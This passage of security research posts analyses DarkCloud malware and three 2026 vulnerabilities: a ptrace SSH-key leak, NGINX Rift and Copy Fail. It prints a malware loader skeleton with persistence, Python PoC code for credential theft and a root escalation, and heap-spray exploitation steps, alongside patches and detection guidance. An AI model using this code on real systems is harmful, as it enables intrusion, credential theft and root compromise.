Once the environment passes, the core processor injects the DarkCloud payload. The injection method commonly observed in DarkCloud campaigns uses `VirtualProtect()` to mark a memory region as executable and then calls `CallWindowProc()` to redirect execution into it. This sidesteps the classic `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` pattern that most behavior engines watch for. It is not novel but it is effective. The payload runs in memory under the original process. From the OS perspective, it is still just `Quotation No 550.exe`.

DarkCloud is an information stealer written in Visual Basic 6 at its core, though modern variants ship wrapped in .NET. Once active, it targets browser credential stores directly. For Chrome and Chromium-based browsers, it reads `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`, an SQLite database that stores saved passwords encrypted with DPAPI. The Windows Data Protection API ties encryption to the logged-in user account and machine, which means DarkCloud calls `CryptUnprotectData()` directly in the context of the victim process to decrypt those passwords with no external key required. For Firefox, it queries the NSS database via `SELECT a11,length(a11) FROM nssPrivate` and recovers master password-protected entries where the user has not set a strong master password. It also pulls from Gecko-based browsers, email clients (Thunderbird, Outlook profile files), FTP clients, and any crypto wallet data it can locate.

Persistence is straightforward. DarkCloud writes itself to `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` with a path pointing to a copy of the loader it drops, usually in `%APPDATA%` or `%USERPROFILE%`. RunOnce executes once on next login and removes itself afterward, so the registry entry is only visible between infection and first reboot.

Before exfiltration, DarkCloud checks for analysis tools. It looks for process names including `wireshark.exe`, `fiddler.exe`, `processhacker.exe`, `tcpview.exe`, `windbg.exe`, and `processhacker.exe` in the running process list. If it finds any, it sleeps or exits. The malware also fetches the victim's public IP from a site like `showip.net` to include in the exfil package, which is useful for the operator to geolocate victims and prioritize high-value targets.

The full MITRE ATT&CK coverage here: T1027 (Obfuscated Files), T1620 (Reflective Code Loading), T1497.001 (Sandbox Evasion: System Checks), T1055 (Process Injection), T1547.001 (Registry Run Keys), T1555.003 (Credentials from Web Browsers), T1056.001 (Keylogging), T1082 (System Information Discovery), T1113 (Screen Capture), T1071.001 (Web Protocols for C2 exfil).

---

## Educational Sample: Reflective .NET Loading Skeleton

The following demonstrates the core DarkTortilla technique, `Assembly.Load()` reflective loading, without any payload. This is what the two-stage loader looks like structurally.

```csharp
// EDUCATIONAL SAMPLE — demonstrates .NET Reflective Assembly Loading
// This is the structural pattern DarkTortilla uses to load its core processor
// This does NOT contain any malicious payload
// For research and defensive awareness only

using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

class ReflectiveLoaderDemo
{
    // Anti-VM check: DarkTortilla looks for known VM MAC prefixes and registry keys
    static bool IsVirtualEnvironment()
    {
        try
        {
            object cpuReg = Microsoft.Win32.Registry.GetValue(
                @"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0",
                "ProcessorNameString", "");
            
            string cpu = cpuReg?.ToString().ToUpperInvariant() ?? "";
            string[] vmMarkers = { "VBOX", "VMWARE", "QEMU", "HYPERV" };
            
            foreach (string marker in vmMarkers)
                if (cpu.Contains(marker)) return true;
        }
        catch { /* silently pass on access errors */ }
        
        return false;
    }

    // Stage 1: Decrypt the core processor bytes from an embedded resource
    // In the real loader, encryptedBlob comes from a .NET resource or appended data
    static byte[] DecryptPayload(byte[] encryptedBlob, byte[] aesKey, byte[] iv)
    {
        using var aes = Aes.Create();
        aes.Key = aesKey;    // 32-byte key derived from hardcoded config value
        aes.IV  = iv;        // 16-byte IV stored adjacent to encrypted blob
        using var ms = new MemoryStream(encryptedBlob);
        using var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read);
        using var result = new MemoryStream();
        cs.CopyTo(result);
        return result.ToArray();
    }

    // Stage 2: Reflective load — the key technique.
    // Assembly.Load() takes raw bytes, no file touches disk.
    // The loaded assembly's entry point is invoked directly in memory.
    static void ReflectiveLoad(byte[] assemblyBytes)
    {
        Assembly loaded = Assembly.Load(assemblyBytes);
        MethodInfo entry = loaded.EntryPoint;

        // Invoke with empty args — real DarkTortilla passes a config struct here
        entry?.Invoke(null, new object[] { new string[0] });
    }

    // Stage 3: RunOnce persistence — DarkCloud adds itself here post-injection
    static void SetRunOncePersistence(string keyName, string executablePath)
    {
        using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
            @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", writable: true);
        key?.SetValue(keyName, $"\"{executablePath}\"");
        // Registry entry auto-deletes after next login execution
    }

    static void Main()
    {
        if (IsVirtualEnvironment()) { Environment.Exit(0); return; }

        // Placeholder bytes — a real loader would decrypt these from a resource
        byte[] fakePayload   = new byte[256];  // zeroed, no real assembly
        byte[] fakeAesKey    = new byte[32];   // zeroed key
        byte[] fakeIv        = new byte[16];   // zeroed IV

        Console.WriteLine("[demo] Reflective loading pattern shown above.");
        Console.WriteLine("[demo] Assembly.Load() never writes a file to disk.");
        Console.WriteLine("[demo] RunOnce key: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");

        // ReflectiveLoad(DecryptPayload(fakePayload, fakeAesKey, fakeIv));
        // SetRunOncePersistence("SystemUpdateHelper", @"C:\Users\victim\AppData\Roaming\svchst.exe");
    }
}
```

The comment on the last two lines is the point. In the real chain, those two calls are exactly what runs. The AV-bypassing part is entirely in `Assembly.Load()`: the runtime never sees a suspicious file path, no scan hook fires on a file write, and the loaded assembly inherits the parent process's trust level. It is a primitive that .NET exposes for legitimate plugin architectures, and DarkTortilla has been abusing it for years.

---

## Detection and Defense

The Stairwell team published a solid YARA hunting rule for DarkCloud variants in August 2025. Key strings to match include `SELECT a11,length(a11) FROM nssPrivate` (Firefox NSS query), `DarkCloud Credentials` and `DarkCloud Keylogger` (internal module names present in unobfuscated builds), and `C:\Users\Public\Libraries\vbsqlite3.dll` (a path the stealer drops its SQLite helper to). Three or more matches on the `$s*` strings or four matches on the `$c*` code-specific strings indicate a high-confidence hit.

For Sysmon-based detection, the events that matter most here are Event ID 13 (Registry value set) watching for writes to `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` by unexpected processes, Event ID 10 (Process access) for `Quotation*.exe` or similarly named business-lure processes opening `lsass.exe` or accessing Chrome's `Login Data` file, and Event ID 7 (Image loaded) watching for `clrjit.dll` and `mscorlib.dll` being loaded inside uncommon processes, which signals .NET runtime activation in something that should not be running managed code.

On the network side, watch for outbound HTTP GET requests to `showip.net`, `checkip.amazonaws.com`, or similar IP-discovery services from user processes. That pattern is nearly always malware performing victim geolocation before exfil.

Mitigations: restrict execution of unsigned .NET assemblies via AppLocker or WDAC policies, enable Credential Guard to protect LSASS-based secrets, and consider pushing Chrome's App-Bound Encryption (introduced in Chrome 127) which stores encryption keys in a way that blocks cross-process DPAPI abuse at the browser credential level. That last control specifically targets the `CryptUnprotectData()` bypass DarkCloud relies on.

Practically speaking, this family is not going anywhere. DarkTortilla has been distributing payloads for over a decade because the combination of .NET reflective loading and layered encryption works. DarkCloud has been under active development since 2022 and is sold as a builder with configurable modules. When two mature, maintained tools combine in a single delivery, you get exactly what landed on Bazaar this morning: a 1.3MB `.exe` masquerading as a business document that empties a victim's credential store before their endpoint protection notices the loader ever ran.
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="039" type="security-research-post">
<FRONTMATTER>
TITLE      : CVE-2026-46333: How One ptrace Window Leaks Your SSH Keys
DATE       : 2026-05-27
URL        : https://garrettstimpson.ca/posts/2026/05/27/cve-2026-46333-ssh-keysign-pwn/
CVE        : CVE-2026-46333, cve-2026-46333
CATEGORIES : exploits, linux, lpe
TAGS       : cve, ptrace, pidfd, linux-kernel, ssh, privilege-escalation
WORD_COUNT : 898
EXCERPT    : A narrow window between process teardown steps lets any local user clone open file descriptors from root-owned binaries. The result: host SSH private keys, shadow password hashes, and a root shell.
</FRONTMATTER>
<BODY>
There's a moment during process exit when the Linux kernel is in a weird in-between state. The task's memory descriptor has been detached. The file descriptor table hasn't been closed yet. For most things, this doesn't matter. But for a specific combination of ptrace access checks and a relatively new syscall called `pidfd_getfd`, it turns into a full credential theft primitive.

That's CVE-2026-46333. Qualys published the full advisory on May 20, 2026, and named it "ssh-keysign-pwn" after the most impactful of the four exploit variants they demonstrated.

## What's actually happening

When a Linux process calls `exit()` or otherwise terminates, the kernel tears down its resources in a specific order. Memory mappings come down first. File descriptors close after. Between those two events there's a brief window where the task is technically dead (its `mm` struct is NULL) but its file descriptor table is still live.

Here's where `ptrace` comes in. The kernel's standard `ptrace_has_perm()` check bails out early when the target's `mm` is NULL. It assumes a task without a memory descriptor can't be traced. This is fine for most ptrace operations. But `pidfd_getfd(2)` is different. That syscall was added in kernel 5.6 as a way to clone file descriptors from one process to another. It checks ptrace permissions, hits the early return when `mm` is NULL, and happily proceeds to clone whatever file descriptors the dying process still has open.

So: a SUID root binary opens a sensitive file, starts shutting down, drops its memory descriptor, and in the gap before it closes its file table, any local unprivileged process can call `pidfd_getfd()` and grab a copy of that open file descriptor. Under the caller's own UID.

## The four variants Qualys demonstrated

The most severe is `ssh-keysign`. This binary is SUID root and opens SSH host private key files at `/etc/ssh/*_key` during normal operation. Grab the fd during the exit window and you have an open readable handle to the host's private keys. No password required.

Second is `chage`, which reads `/etc/shadow` during exit. Same mechanics, different prize.

Third and fourth are `pkexec` and `accounts-daemon`, both of which have their own wrinkles around credential file access during teardown.

In practice the ssh-keysign variant is the one that hurts most. Host SSH private keys mean you can impersonate the server, MITM incoming SSH connections, or depending on your target environment, pivot into adjacent systems that trust the host key.

## A minimal PoC sketch

The basic idea is straightforward:

```python
import os, ctypes, struct

# Open a pidfd handle to the target process
# (a SUID binary that opens /etc/ssh/*_key during exit)
target_pid = find_suid_process("ssh-keysign")
pidfd = syscall_pidfd_open(target_pid, 0)

# Spin until the process mm goes NULL (check /proc/[pid]/status)
# At that point the kernel's ptrace permission check is bypassed
while process_has_mm(target_pid):
    pass

# Now clone the file descriptor pointing at the SSH key
stolen_fd = syscall_pidfd_getfd(pidfd, remote_fd_for_ssh_key, 0)

# Read it out
with os.fdopen(stolen_fd, 'rb') as f:
    key_material = f.read()
    print(key_material.decode())
```

The actual implementation requires knowing the remote fd number, which means either watching the target's `/proc/[pid]/fd/` directory or timing the grab after a predictable open sequence. Qualys's full PoC includes the timing logic.

## Reliability

What makes this interesting compared to something like Dirty Cow is that it's not a classic data race against another CPU thread. You're racing against the kernel's own teardown sequence, but the window is wide enough to be reliably exploitable. Qualys describes consistent success across test runs.

## Patch status

Linus merged the fix on 2026-05-14 as commit `31e62c2ebbfd`. The change adds a proper check: if the target task has no `mm`, the `pidfd_getfd` path now returns `EPERM` instead of proceeding. Debian, Fedora, RHEL, and Ubuntu have all shipped patched packages.

If you're on an unpatched kernel, the fastest mitigation is restricting ptrace scope via `/proc/sys/kernel/yama/ptrace_scope`. Setting it to 1 limits ptrace to parent processes only, which closes most of the attack surface.

```bash
# Check your current Yama ptrace scope
cat /proc/sys/kernel/yama/ptrace_scope

# Temporary mitigation (survives until reboot)
echo 1 > /proc/sys/kernel/yama/ptrace_scope

# Permanent (add to sysctl.conf)
echo "kernel.yama.ptrace_scope = 1" >> /etc/sysctl.conf
sysctl -p
```

## Why this matters past the patch

The interesting part of CVE-2026-46333 is what it reveals about `pidfd_getfd` as an attack primitive. The syscall was designed for legitimate FD passing between cooperating processes. But anytime you can grab an open fd from a more privileged process, you get that process's access level on that specific resource. No setuid bits, no capability checks, no credential transitions.

What other SUID binaries open sensitive files during their exit paths? `ssh-keysign` and `chage` were the obvious ones. The bug has been in the kernel since `pidfd_getfd` was merged in 5.6. Years of exposure.

Check your kernel version. Patch if you haven't.

---

*Based on the [Qualys advisory](https://blog.qualys.com/vulnerabilities-threat-research/2026/05/20/cve-2026-46333-local-root-privilege-escalation-and-credential-disclosure-in-the-linux-kernel-ptrace-path) published 2026-05-20 and the [CloudLinux write-up](https://blog.cloudlinux.com/ptrace-exit-race-cve-2026-46333-mitigation-and-kernel-update).*
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="040" type="security-research-post">
<FRONTMATTER>
TITLE      : CVE-2026-42945: NGINX Rift, an 18-Year Heap Overflow With a Working RCE Chain
DATE       : 2026-05-27
URL        : https://garrettstimpson.ca/posts/2026/05/27/cve-2026-42945-nginx-rift-heap-overflow-rce/
CVE        : CVE-2026-42945, cve-2026-42945
CATEGORIES : exploits, web
TAGS       : CVE-2026-42945, nginx, heap-overflow, RCE, heap-feng-shui, webserver, remote-exploit
WORD_COUNT : 1426
EXCERPT    : A two-pass script engine bug introduced in 2008 lets a remote attacker overflow the heap in any NGINX worker processing rewrite directives. The public PoC chains it to unauthenticated RCE via pool cleanup pointer overwrite and POST body spraying.
</FRONTMATTER>
<BODY>
**CVE:** CVE-2026-42945  
**CVSS:** 9.2 (Critical)  
**Alias:** NGINX Rift  
**Discovered by:** Zhenpeng (Leo) Lin at DepthFirst  
**Disclosed:** May 13, 2026  
**Affected versions:** NGINX Open Source 0.6.27 through 1.30.0, NGINX Plus R32 through R36, NGINX Ingress Controller through 5.4.1, NGINX Gateway Fabric through 2.5.1, several F5 product lines  
**Fixed in:** NGINX 1.28.1 (stable), 1.29.0 (mainline)  
**Public PoC:** [DepthFirstDisclosures/Nginx-Rift](https://github.com/DepthFirstDisclosures/Nginx-Rift)

---

Heap overflows in web servers get a lot of hype and not much working code. NGINX Rift is different. There is a public PoC demonstrating unauthenticated RCE, a video of it executing commands, and an ASLR bypass chain that the researchers held back from the initial release but have since published. This one is real.

What makes the underlying bug interesting, aside from the 18-year residence time, is the root cause. It is not a missing bounds check. It is not an integer overflow. It is a state propagation error in a two-pass script engine, where an internal flag set during one directive gets used in a different context with different semantics. It is the kind of bug that slips through code review because both passes look correct in isolation.

## The Two-Pass Engine

NGINX's rewrite module uses a compiled script representation. When it processes a `rewrite` or `set` directive at configuration load time, it compiles the directive into a sequence of operations. At request time, it runs this sequence in two passes: first a length calculation pass that determines how much memory to allocate, then a copy pass that writes the actual data into the allocated buffer.

The design is sensible. Single allocation, no repeated small allocs, predictable memory use. The catch is that both passes must compute the same length. If anything causes the copy pass to write more bytes than the length pass counted, you have a heap overflow.

## The Flag That Doesn't Reset

The trigger requires two directives together: a `rewrite` containing a question mark in its replacement string, followed by a `set` referencing a regex capture group. The question mark matters because it causes `ngx_http_script_start_args_code` to set `e->is_args = 1` on the script engine. This flag is never cleared.

```c
void
ngx_http_script_start_args_code(ngx_http_script_engine_t *e)
{
    e->is_args = 1;
    e->args = e->pos;
    e->ip += sizeof(uintptr_t);
}
```

When the subsequent `set` directive's capture group is evaluated, it goes through `ngx_http_script_complex_value_code`. This function runs the length calculation using a fresh sub-engine:

```c
ngx_memzero(&le, sizeof(ngx_http_script_engine_t));
le.ip = code->lengths->elts;
```

That zero-initialized sub-engine has `le.is_args = 0`. The length calculation function `ngx_http_script_copy_capture_len_code` checks `e->is_args` before deciding whether to account for URI escaping:

```c
if ((e->is_args || e->quote)
    && (e->request->quoted_uri || e->request->plus_in_uri))
{
    return cap_len + 2 * ngx_escape_uri(NULL, ...);  // escaped length
} else {
    return cap_len;                                   // raw length
}
```

`le.is_args` is zero, so the length calculation returns the raw, unescaped length and allocates accordingly.

The copy pass runs on the main engine where `e->is_args` is still set to `1`. The exact same conditional now evaluates true. It calls `ngx_escape_uri` with `NGX_ESCAPE_ARGS`, which expands every escapable character (plus signs, ampersands, etc.) from one byte to three bytes. If the capture group contains `N` escapable characters, the copy writes `raw_len + 2*N` bytes into a buffer sized for `raw_len`.

An attacker with a crafted URI containing many plus signs controls `N` directly. The overflow size is under their control.

## A Configuration That Exposes the Bug

```nginx
location ~ ^/api/(.*)$ {
    rewrite ^/api/(.*)$ /internal?migrated=true;
    set $original_endpoint $1;
}
```

This pattern is common in API migration setups: rewrite to a new path, capture the old path for logging or forwarding. Both directives are entirely normal. There is no obvious attack surface here at the configuration level.

A request to `/api/++++++++++++++++++++++++++++++` (hundreds of plus signs) blows past the buffer boundary on the copy pass.

## Exploitation: Heap Feng Shui and Pool Corruption

NGINX's multi-process architecture is actually what makes this exploitable rather than just a crash generator. Worker processes fork from the master. Because they fork, they share the same heap layout. If you crash a worker, the master spawns a new one with the same layout. Retry until success.

The target is `ngx_pool_t`, specifically its `cleanup` field at offset 64. NGINX pools have a linked list of cleanup handlers: function pointers called when the pool is destroyed.

```c
struct ngx_pool_cleanup_s {
    ngx_pool_cleanup_pt   handler;
    void                 *data;
    ngx_pool_cleanup_t   *next;
};
```

If you can overwrite the `cleanup` pointer to point at a fake structure, you control what function gets called with what argument when the pool tears down.

The trick is timing. To overwrite the pool header, you also overwrite its allocation metadata (`d`, `max`, `current`, `chain`, `large`), which are at lower offsets. If the worker tries to allocate from the pool after the overflow, it dereferences one of those corrupted pointers and crashes before you can do anything useful. The researchers solved this with a connection ordering technique:

1. Open connection A, send partial headers. NGINX allocates a request pool for it.
2. Open connection B (victim). NGINX allocates the victim pool adjacent to A's pool on the heap.
3. Complete connection A's headers, triggering the rewrite overflow out of A's pool and into the victim pool header.
4. Immediately close connection B. NGINX calls `ngx_destroy_pool`, which walks the `cleanup` list. It does not touch the corrupted allocation fields.

The cleanup pointer gets dereferenced with the corrupted value before the allocator corruption ever causes a crash.

## POST Body Spraying for Arbitrary Pointers

The overflow payload consists of URI-safe characters (the escaped plus signs and similar bytes). Binary pointers, which often contain null bytes, cannot pass through the URI parser intact. The researchers solved this by spraying the heap with POST request bodies: raw data streams that accept arbitrary bytes. A fake `ngx_pool_cleanup_s` structure pointing to `system()` from libc, with a command string as the `data` field, gets sprayed at a predictable offset. The NGINX heap layout is deterministic across workers, so the spray lands at a known address. The overflow writes that address into the `cleanup` pointer, and when connection B closes, NGINX calls `system("your_command")`.

The PoC on GitHub demonstrates this against NGINX with ASLR disabled. The ASLR bypass chain exploits the deterministic multi-fork layout to leak runtime addresses progressively, though the researchers did not release that chain at initial disclosure.

## Scope

This is not a niche configuration. `rewrite` and `set` together appear in a large fraction of real NGINX configs. API gateways, reverse proxies, any migration setup that captures and stores parts of the old URL. F5's NGINX Plus R32 through R36, NGINX Ingress Controller (used for Kubernetes ingress), and NGINX Gateway Fabric are all affected.

The NGINX security advisory (F5 K000160932) confirms active exploitation attempts. Qualysec reported confirmed in-the-wild attacks as of late May 2026.

## Patches and Mitigations

Update to NGINX 1.28.1 (stable branch) or 1.29.0 (mainline). For NGINX Plus, R37 includes the fix. For Kubernetes users on NGINX Ingress Controller, 5.5.0 is patched.

If you cannot patch immediately, the most direct mitigation is to audit your configs for the combination of a `rewrite` with a question mark followed by a `set` with a capture reference:

```bash
nginx -T | grep -A2 'rewrite.*\?'
```

Any `rewrite` containing `?` in the replacement string that is followed by a `set` with a capture variable (`$1`, `$2`, etc.) in the same location block is potentially vulnerable. Restructuring these configs to avoid the flag-carrying `rewrite` form eliminates the attack surface at the config level.

If you are running affected versions in a containerized environment and cannot upgrade the image immediately, a WAF rule blocking excessive plus signs or percent-encoded characters in the path portion of requests (`%2B`, `+` runs longer than a reasonable threshold) will prevent the overflow trigger. It is not a fix. It buys time.

The full advisory is at F5's security portal (K000160932). Fixed packages are available across all major Linux distributions that ship NGINX.

---

**Sources:**
- [DepthFirst Research: NGINX Rift](https://depthfirst.com/research/nginx-rift-achieving-nginx-rce-via-an-18-year-old-vulnerability)
- [GitHub PoC: DepthFirstDisclosures/Nginx-Rift](https://github.com/DepthFirstDisclosures/Nginx-Rift)
- [Akamai analysis: CVE-2026-42945](https://www.akamai.com/blog/security-research/nginx-critical-heap-buffer-overflow-cve-2026-42945)
- [Qualysec: Active exploitation report](https://qualysec.com/cybersecurity-news/nginx-cve-2026-42945-exploited-in-wild/)
- [The Hacker News coverage](https://thehackernews.com/2026/05/18-year-old-nginx-rewrite-module-flaw.html)
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="041" type="security-research-post">
<FRONTMATTER>
TITLE      : CVE-2026-31431: Copy Fail — 732 Bytes to Root on Every Major Linux Distro
DATE       : 2026-05-27
URL        : https://garrettstimpson.ca/posts/2026/05/27/cve-2026-31431-copy-fail-linux-lpe/
CVE        : cve-2026-31431, CVE-2026-31431
CATEGORIES : kernel, lpe, linux, cve
TAGS       : CVE-2026-31431, linux, kernel, privilege-escalation, AF_ALG, page-cache, container-escape, cloud
WORD_COUNT : 1284
EXCERPT    : >
</FRONTMATTER>
<BODY>
**CVE:** CVE-2026-31431
**CVSS:** 7.8 (High)
**Disclosed:** April 29, 2026 (Xint Code / Theori)
**Affected kernels:** ~2017–2026 (all distros shipping kernel with `algif_aead.c` in-place optimization)
**Public PoC:** Yes — [SeanRickerd/cve-2026-31431](https://github.com/SeanRickerd/cve-2026-31431)
**Patch commit:** [a664bf3d603d](https://github.com/torvalds/linux/commit/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)

---

## The One-Liner

Three independent, reasonable kernel changes — made in 2011, 2015, and 2017 — line up in exactly the wrong way. The result: any unprivileged local user can write 4 arbitrary bytes into the page cache of any readable file on the system, repeat it across offsets, and turn a setuid binary into a root shell. No race. No crash. 732 bytes of Python using only the standard library.

---

## Background: The Three Pieces

### Piece 1 — `authencesn` (2011)

`authencesn` is an AEAD wrapper added in 2011 for IPsec Extended Sequence Number support ([commit a5079d084f8b](https://github.com/torvalds/linux/commit/a5079d084f8b)). IPsec uses 64-bit sequence numbers split into `seqno_hi` (bytes 0–3 of AAD) and `seqno_lo` (bytes 4–7). To rearrange these for HMAC computation, `authencesn` uses the destination buffer as scratch space inside `crypto_authenc_esn_decrypt()`:

```c
scatterwalk_map_and_copy(tmp, dst, 0, 8, 0);                           // read AAD bytes 0–7
scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);                           // overwrite dst[4..7] with seqno_hi
scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);     // write seqno_lo PAST the tag
```

That third call writes 4 bytes at `dst[assoclen + cryptlen]` — **past the end of the AEAD output**. No other standard kernel AEAD does this. Harmless at the time: the only callers were the kernel's internal xfrm layer with tightly controlled scatterlists.

### Piece 2 — `AF_ALG` AEAD socket support (2015)

`AF_ALG` exposes the kernel's entire crypto subsystem to unprivileged userspace. In 2015 this gained AEAD support with a `splice()` path. `splice()` transfers page references without copying — when you `splice()` a file into an `AF_ALG` socket, the socket's scatterlist holds direct pointers to the kernel's page cache pages for that file. At this point, out-of-place operation kept page cache pages safe in `req->src` (read-only). Not yet exploitable.

### Piece 3 — The In-Place Optimization (2017)

[Commit 72548b093ee3](https://github.com/torvalds/linux/commit/72548b093ee3) optimized `algif_aead.c` to run AEAD in-place. It copied AAD and ciphertext from the TX SGL into the RX buffer, but chained the tag pages **by reference** using `sg_chain()`, then set `req->src = req->dst`. Page cache pages from `splice()` were now in the writable destination scatterlist. `authencesn`'s write at `dst[assoclen + cryptlen]` would now walk into those tag pages. Bug silently introduced. Nobody connected the three changes for nearly a decade.

---

## The Vulnerability

When `authencesn` decrypts inside the AF_ALG in-place path, its third scratch write walks past the RX buffer into the chained page cache pages. `scatterwalk_map_and_copy` calls `kmap_local_page()`, maps the page, and writes 4 bytes — `seqno_lo` — directly into the kernel's cached copy of the target file. `recvmsg()` returns `-EBADMSG` (HMAC fails on the fabricated ciphertext), but **the write already happened and is permanent in the page cache**.

The attacker controls three axes:

| Axis | Control mechanism |
|------|-------------------|
| **Which file** | Any file readable by current user — `/usr/bin/su` is world-readable |
| **Which offset** | Chosen via splice file offset, splice length, and `assoclen` |
| **Which 4 bytes** | AAD bytes 4–7 in `sendmsg()` → directly written as `seqno_lo` |

---

## The Exploit Chain

Default target: `/usr/bin/su` — setuid-root, world-readable, present on all tested distros.

### Step 1: Socket Setup

```python
import socket, os

# AF_ALG = 38, SOCK_SEQPACKET = 5
sock = socket.socket(38, 5, 0)
sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))", 0, 16))
sock.setsockopt(279, 4, key)   # ALG_SET_KEY
req = sock.accept()[0]         # creates the request socket — no privileges needed
```

### Step 2: Controlled Write Primitive

For each 4-byte chunk of shellcode:

```python
# AAD bytes 4–7 = the value to write (seqno_lo)
aad = b'\x00' * 4 + payload_chunk + b'\x00' * (assoclen - 8)

req.sendmsg([aad + fake_ct], cmsg_headers, socket.MSG_MORE)

r_pipe, w_pipe = os.pipe()
os.splice(target_fd, w_pipe, splice_offset, splice_len)
os.splice(r_pipe, alg_fd, 0, splice_len)

try:
    req.recv(buf_size)
except OSError:
    pass  # -EBADMSG expected; 4-byte write already committed to page cache
```

### Step 3: Execute

```python
os.execve("/usr/bin/su", ["su"], {})
# kernel loads /usr/bin/su from page cache — our patched version — runs as UID 0
```

On-disk binary is untouched. `sha256sum /usr/bin/su` returns the correct hash. AIDE/Tripwire miss it. Only in-memory page cache scanning catches it.

---

## Tested Distributions

| Distribution | Kernel | Result |
|---|---|---|
| Ubuntu 24.04 LTS | 6.17.0-1007-aws | Root |
| Amazon Linux 2023 | 6.18.8-9.213.amzn2023 | Root |
| RHEL 10.1 | 6.12.0-124.45.1.el10_1 | Root |
| SUSE 16 | 6.12.0-160000.9-default | Root |

Same script, no modification, no recompilation, no per-distro offsets.

---

## Why This is Nastier Than Dirty Cow / Dirty Pipe

| Property | Dirty Cow (2016) | Dirty Pipe (2022) | Copy Fail (2026) |
|---|---|---|---|
| Race condition required | Yes — retries needed | No | No |
| Crash risk | Moderate | Low | Very low |
| Version specific | No | Yes (5.8–5.16) | No (all distros since 2017) |
| Disk artifact | Yes | No | No |
| Container escape | No | Partial | Yes |
| PoC size | ~100 lines C | ~50 lines C | 732 bytes Python |

---

## Container Escape

The page cache is shared across the entire host — containers share it with the host kernel. Code execution inside an unprivileged container + a setuid binary accessible via bind-mount or shared volume = the same primitive crosses container boundaries. Xint published [Part 2](https://xint.io/blog/copy-fail-pod-to-host) detailing the full Kubernetes node compromise across GKE, EKS, and AKS.

---

## The Fix

[Patch a664bf3d603d](https://github.com/torvalds/linux/commit/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5) reverts `algif_aead.c` to out-of-place operation:

```c
// Before (vulnerable): req->src and req->dst point to same scatterlist
aead_request_set_crypt(&areq->cra_u.aead_req, rsgl_src, areq->first_rsgl.sgl.sgt.sgl, used, ctx->iv);

// After (fixed): TX SGL as src, RX SGL as dst — separate, page cache safe
aead_request_set_crypt(&areq->cra_u.aead_req, tsgl_src, areq->first_rsgl.sgl.sgt.sgl, used, ctx->iv);
```

---

## Remediation

**Patch now.** All major distros have shipped fixes:

| Distro | Fix |
|---|---|
| Ubuntu | [ubuntu.com advisory](https://ubuntu.com/blog/copy-fail-vulnerability-fixes-available) |
| RHEL / AlmaLinux | [almalinux.org](https://almalinux.org/blog/2026-05-01-cve-2026-31431-copy-fail/) |
| Amazon Linux 2023 | kernel package update |
| SUSE 16 | kernel package update |

**Immediate mitigation** — disable `algif_aead` if patching isn't possible yet:

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif-aead.conf
rmmod algif_aead 2>/dev/null
```

**Detection** — [Elastic 8.19 rule](https://www.elastic.co/guide/en/security/8.19/potential-copy-fail-cve-2026-31431-exploitation-via-af-alg-socket.html): unprivileged `AF_ALG` bind to `authencesn` + `splice()` targeting setuid binaries.

---

| Date | Event |
|---|---|
| 2026-03-23 | Reported to Linux kernel security team |
| 2026-03-24 | Acknowledgment received |
| 2026-03-25 | Patch proposed and reviewed |
| 2026-04-01 | Committed to mainline |
| 2026-04-22 | CVE-2026-31431 assigned |
| 2026-04-29 | Public disclosure — Xint / Theori |

---

</BODY>
